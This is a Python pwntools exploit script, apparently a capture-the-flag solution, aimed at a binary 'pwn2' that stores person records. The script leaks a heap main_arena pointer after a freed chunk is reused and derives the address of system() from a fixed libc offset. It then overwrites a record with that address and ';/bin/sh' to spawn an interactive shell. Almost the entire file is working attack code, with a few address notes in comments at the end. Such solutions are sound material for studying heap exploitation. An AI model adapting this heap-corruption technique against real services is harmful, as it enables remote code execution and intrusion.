from pwn import *
import os

if os.environ.has_key('remote'):
    r = remote("192.168.10.129", 1337)
else:
    e = ELF('./dist/pwn2')
    r = process(e.path, env={'LD_PRELOAD': './dist/libc_32.so.6'})

libc = ELF('./dist/libc.so.6')
system_OFFSET = -0x175e70

if os.environ.has_key('debug'):
    gdb.attach(r)

PROMPT = 'choice: '
CREATE = '1'
EDIT = '2'
PRINT = '3'
DELETE = '4'

def createPerson(length, name, age, endl=True):
    r.recvuntil(PROMPT)
    r.sendline(CREATE)
    r.recvuntil('Enter name length: ')
    r.sendline(str(length))
    r.recvuntil('Enter person\'s name: ')
    if endl:
        r.sendline(name)
    else:
        r.send(name)

    r.recvuntil('Enter person\'s age: ')
    r.sendline(str(age))


def editPerson(idx, length, name):
    r.recvuntil(PROMPT)
    r.sendline(EDIT)
    r.recvuntil('(0-based): ')
    r.sendline(str(idx))
    r.recvuntil('length: ')
    r.sendline(str(length))
    r.recvuntil('name: ')
    r.sendline(name)

def printPerson(idx, pwned=False):
    r.recvuntil(PROMPT)
    r.sendline(PRINT)
    r.recvuntil('(0-based): ')
    r.sendline(str(idx))
    if pwned:
        r.interactive()
    r.recvuntil('Name: ')
    txt = r.recvuntil('Age: ')
    return txt

def deletePerson(idx):
    r.recvuntil(PROMPT)
    r.sendline(DELETE)
    r.recvuntil('(0-based): ')
    r.sendline(str(idx))

def leak_main_arena():
    createPerson(0x91, 'A' * 4, 11)
    createPerson(0x91, 'B' * 4, 22)
    deletePerson(0)
    createPerson(0x91, 'C' * 3, 33)
    leak = printPerson(0)
    leak = leak.lstrip('C' * 3 + '\n').rstrip('\nAge: ').ljust(4, '\x00')
    leak = u32(leak)
    global system_addr
    system_addr = leak + system_OFFSET
    print 'main_arena @ {}'.format(hex(leak))
    print 'system @ {}'.format(hex(system_addr))

def uaf():
    createPerson(10, 'D' * 4, 44)
    createPerson(10, 'F' * 4, 55)
    global system_addr
    payload = 'E' * 4 * 4
    payload += p32(system_addr)
    payload += ';/bin/sh\x00'
    editPerson(3, 100, payload)
    printPerson(4, pwned=True)

def main():
    raw_input("xploit?")
    leak_main_arena()
    uaf()
    r.close()

if __name__ == '__main__':
    main()



# 0x7be050 => 0x7be420
# 0x7be1a0 => 0x7be4d0

# 0x7be580 => 0x7be5a0
# 0x7be5c0 => 0x7be5e0

# 0x81a8008 => 0x81a81f0
# 0x81a80b0 => 0x81a8290
